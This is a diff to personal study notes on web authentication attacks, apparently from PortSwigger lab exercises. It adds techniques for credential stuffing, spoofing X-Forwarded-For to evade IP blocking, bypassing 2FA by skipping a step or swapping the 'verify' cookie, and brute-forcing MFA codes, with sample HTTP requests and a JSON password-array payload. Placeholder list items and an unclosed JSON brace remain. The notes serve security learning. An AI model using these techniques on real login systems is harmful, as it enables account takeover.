@@ -298,11 +298,17 @@
   - username: business login in format of firstname.lastname; profile name same as login username; email address disclosed in HTTP response such as administrator or IT support
   - password: min chr + lower and uppercase letter + 1 special character. Fine tune the wordlist such as 'Mypassword1!', 'Mypassword2!'
   - Infer correct credential: status code, error message, response times
+  - account locking  - pick a max 3 password guessess + list of victim user
+  - credential stuffing - resuse the same username and password on multiple website
+  - bypass IP blocking - change 'X-Forwarded-For'
 - HTTP basic authentication
   - identify the authorization header in the request: `Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=`
   - Decode the Base64 string to get username:password
   - Use burp suite's intruder to brute force attack
 - Multi-factor authentication  
+  - skip to "logged-in only" pages after completing the first authentication step
+  - attack log in using their credentials but change the 'account' cookie to any arbitrary username when submitting the verification code
+  - brute-force 2FA verification codes by using 'Turbo Intruder' burp extension.
 - OAuth authentication
 - Other authentication  
 
@@ -347,15 +353,43 @@
       payload set 1: password wordlist
       **Grep - Extract: Invalid username or password.**
       Obsereve the empty extract column: note the password
-11. 55
-12. 6
-13. 77
-14. dd
-15. 565
-16. 4545
-17. 5454
-18. 45454
-19. 454
+11. Broken brute-force protection, **multiple credentials per request - Expert**
+    - replace the single string value of password with an array of password wordlist  
+    - 302 response-->right click request-->show response in browser  
+    ```json
+    {
+    "username" : "carlos",
+    "password": [
+        "123456",
+        "password",
+        "qwerty"
+        ...
+    ]
+    ```
+13. 2FA simple bypass
+    - skip to logged in page after 1FA
+15. 2FA broken logic
+    - POST /login HTTP/2  
+      **username=wiener**&password=peter
+    - 1 step authentication  
+      GET /login2 HTTP/2  
+      Cookie: verify=wiener; session=xxx  
+    - POST /login2 HTTP/2  
+      Cookie: verify=wiener; session=xxx   
+      mfa-code=0950  
+    - Logout from my account  
+    - send to **repeater**: GET /login2 HTTP/2 to repeater  (**change verify=carlos;**)  
+    - send to **intruder**: POST /login2 HTTP/2  
+      Cookie: verify=carlos; session=xxx  
+      **mfa-code=§1381§**  
+      Burp intruder-->Sniper-->payload brute forcer 0...9, min/max length 4  
+    - Load the 302 response in the browser  
+17. dd
+18. 565
+19. 4545
+20. 5454
+21. 45454
+22. 454
 
 ## Business Logic Vulnerabilities
 Content for Business Logic Vulnerabilities...
